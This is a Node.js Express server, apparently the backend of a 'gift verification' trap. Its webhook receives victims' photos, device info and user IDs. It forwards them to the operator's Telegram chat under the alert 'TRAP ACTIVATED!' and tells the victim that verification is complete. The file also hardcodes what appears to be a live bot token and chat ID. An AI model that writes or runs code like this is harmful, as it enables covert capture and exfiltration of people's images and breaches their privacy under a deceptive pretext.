const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.json({ limit: '50mb' }));

const BOT_TOKEN = '8226782560:AAGblZ-1hrNRdVuHfeU59tMlK50zDPYwMGE';
const OWNER_CHAT_ID = '8215819954';

// Webhook endpoint to receive photos
app.post('/webhook', async (req, res) => {
    try {
        const { token, user_id, photos, device_info } = req.body;
        
        console.log(`Received ${photos.length} photos for token: ${token}`);
        
        // 1. Send notification to owner
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: OWNER_CHAT_ID,
            text: `🎯 *TRAP ACTIVATED!*\n\nToken: ${token}\nUser ID: ${user_id}\nPhotos: ${photos.length}\nDevice: ${device_info}\n\nProcessing photos...`,
            parse_mode: 'Markdown'
        });
        
        // 2. Send each photo to owner (first 3)
        for (let i = 0; i < Math.min(3, photos.length); i++) {
            try {
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    chat_id: OWNER_CHAT_ID,
                    photo: `data:image/jpeg;base64,${photos[i]}`,
                    caption: `Photo ${i+1}/${photos.length} from ${user_id}`
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            } catch (photoError) {
                console.error(`Error sending photo ${i}:`, photoError);
            }
        }
        
        // 3. Send to user (first 3 photos)
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: user_id,
                text: `🎉 *Gift Verification Complete!*\n\n${photos.length} photos captured successfully.\n\nHere are your photos:`,
                parse_mode: 'Markdown'
            });
            
            for (let i = 0; i < Math.min(3, photos.length); i++) {
                await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    chat_id: user_id,
                    photo: `data:image/jpeg;base64,${photos[i]}`,
                    caption: `Your photo ${i+1}`
                });
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (userError) {
            console.error('Error sending to user:', userError);
        }
        
        res.json({ success: true, message: 'Photos processed successfully' });
        
    } catch (error) {
        console.error('Webhook error:', error);
        res.status(500).json({ error: 'Processing failed' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
